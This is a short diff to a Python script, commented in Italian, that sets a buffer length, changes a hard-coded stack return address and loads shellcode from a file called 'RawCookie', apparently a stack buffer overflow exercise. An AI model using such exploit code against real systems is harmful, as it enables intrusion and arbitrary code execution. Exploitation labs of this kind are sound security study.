@@ -1,7 +1,7 @@
 import struct
 
 buff_len = 80 + 8 #cambia in base al tuo pc
-addr = 0x7fffffffd8c0 #cambia in base al tuo pc
+addr = 0x7fffffffd860 #cambia in base al tuo pc
 
 f = open('RawCookie', 'rb') #nome del RawFile estratto
 shellcode = f.read()
